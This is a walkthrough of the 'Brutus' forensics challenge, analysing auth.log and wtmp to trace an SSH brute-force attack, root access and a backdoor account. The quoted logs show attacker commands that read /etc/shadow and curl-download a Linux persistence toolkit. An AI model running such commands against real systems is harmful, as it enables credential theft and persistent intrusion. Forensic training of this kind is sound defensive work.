# **HTB Sherlock - Brutus | Entry Level | DFIR**

The task is to analyse an SSH brute-force attack against a server. The attacker gained root access and later 
created a new user with escalated privileges. We are given an auth.log file, a wtmp file, and a Python script. 

### - *Task 1: Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?*

We begin by opening the auth.log file. This will give us records of Linux user authentication, authorization, and privilege escalation. 
This is ideal as we have been told there was a brute-force SSH attack. We can see the attackers IP address clearly throughout the auth.log file, but the following entry is interesting because it shows a successful login attempt over SSH.

```Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2```

**The attacker's IP address is: 65.2.161.68**

### - *Task 2: The brute-force attempts were successful and attacker gained access to an account on the server. What is the username of the account?*

As we can see in the log entry, the attacker gains access using root.

**The username of the account is: root**

### - *Task 3: Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.*

We may be tempted to input any of the successful login timestamps from auth.log. These would not prove successful. So far, using the auth.log file, we have been looking at automated access attempts. This question now specifies manual login. This is where the wtmp file might be useful, as it can give an account of login/logout records. The wtmp is not human-readable, so we need a tool to make it so. We have been given a file called utmp.py as well. If we open this file we can see the description "simple utmp parser", followed by a Python script deeper in the file (wtmp and utmp files should be very similar, so the script should run fine). 

We will try to get the Python script to parse the wtmp file for us, allowing us to read the file and find the attacker's login records. In the terminal we first find the files (cd Downloads > cd Brutus). Then we can run: Python3 utmp.py wtmp. We will find the following log entry with the attacker's known IP address:

```"USER"	"2549"	"pts/1"	"ts/1"	"root"	"65.2.161.68"	"0"	"0"	"0"	"2024/03/06 06:32:45"	"387923"	"65.2.161.68"```

**The UTC timestamp is: 2024-03-06 06:32:45**

### - *Task 4: SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?*

During task 2 we were looking at the root account in the auth.log file. If we go back to that file, identify the successful SSH session, we find the following: 

```Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2```

```Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)```

```Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.```

**The session number is 37**

### - *Task 5: The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?*

If we stay in the auth.log file we will find entries (timestamped Mar 6 06:34:18) that note a new user, followed by privilege escalation.

```Mar  6 06:37:34 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002) by (uid=0)```

```Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow```

```Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)```

**The name of the new user account is: cyberjunkie**

### - *Task 6: What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?*

We can find the answer by searching at: https://attack.mitre.org/ In the persistence section we will find entries on account creation. Notably ID T1136.001: *"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service."*

**The sub-technique ID is: T1136.001**

### - *Task 7: What time did the attacker's first SSH session end according to auth.log?*

A quick CTRL + F search for 'SSH' shows us the first successful entry:

```Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2```

```Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)```

We can then see the following session end:

```Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user```

```Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184```

```Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root```

**The attacker's first SSH session ended, according to auth.log, on 2024-03-06 06:37:24**

### - *Task 8: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?*

Towards the end of the auth.log file we find an obvious answer, as it's the only web link in the entire log:

```Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh```

However, we want to be sure, so a quick Google reveals that linper.sh is an open-source, post-exploitation Linux persistence toolkit.

**Therefore the full command is /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh**
